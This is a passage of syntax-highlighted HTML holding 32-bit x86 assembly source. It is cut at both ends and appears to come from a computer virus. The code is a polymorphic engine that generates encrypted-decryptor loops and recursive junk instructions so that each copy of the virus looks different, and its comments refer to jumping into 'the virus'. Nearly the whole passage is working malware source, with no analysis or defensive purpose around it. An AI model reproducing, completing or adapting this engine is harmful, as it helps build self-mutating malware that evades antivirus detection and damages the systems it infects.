                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_sub_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">down_with_dec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate DEC reg_index</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Next counter value</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_next_ctr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Check counter direction and update counter</span><span class="sc0">
                </span><span class="sc1">;using a INC or DEC instruction</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">upd_ctr_down</span><span class="sc0">
</span><span class="sc5">upd_ctr_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">upd_ctr_ok</span><span class="sc0">
</span><span class="sc5">upd_ctr_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">upd_ctr_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Loop</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_loop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Use counter reg in CMP instruction?</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CMPCTR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">doloopauxreg</span><span class="sc0">

                </span><span class="sc1">;Generate CMP counter_reg,end_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">doloopready</span><span class="sc0">

</span><span class="sc5">doloopauxreg</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Get a random valid register to use in a CMP instruction</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

                </span><span class="sc1">;Move index reg value into aux reg</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Guess what!?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Generate CMP aux_reg,end_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                     
                </span><span class="sc1">;Restore aux reg state</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

</span><span class="sc5">doloopready</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Generate the following structure:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       loop_point:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       cmp reg,x</span><span class="sc0">
                </span><span class="sc1">;       jne loop_point</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       jmp virus</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate some garbage code</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_garbage</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;More recursive levels allowed?</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">exit_gg</span><span class="sc0">

                </span><span class="sc1">;Well, we can call this routine from lots of places</span><span class="sc0">
                </span><span class="sc1">;in the virus, so take care about direction flag</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc1">;Choose garbage generator</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loop_garbage</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_garbage</span><span class="sc4">-</span><span class="sc5">tbl_garbage</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_garbage</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_garbage</span><span class="sc0">

                </span><span class="sc1">;Update recursive level</span><span class="sc0">

</span><span class="sc5">exit_gg</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate MOV reg,imm</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_movreg32imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate MOV reg32,imm</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg16imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate MOV reg16,imm</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B866h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Generate MOV reg8,imm</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movreg8imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate mov reg,reg</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
</span><span class="sc5">c_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movregreg16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">c_movregreg32</span><span class="sc0">

</span><span class="sc5">g_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2400h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate MOVZX/MOVSX reg32,reg16</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">d_movzx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
</span><span class="sc5">d_movzx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate ADD/SUB/XOR/OR/AND reg,imm</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_mathregimm32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregimm16</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8166h</span><span class="sc0">
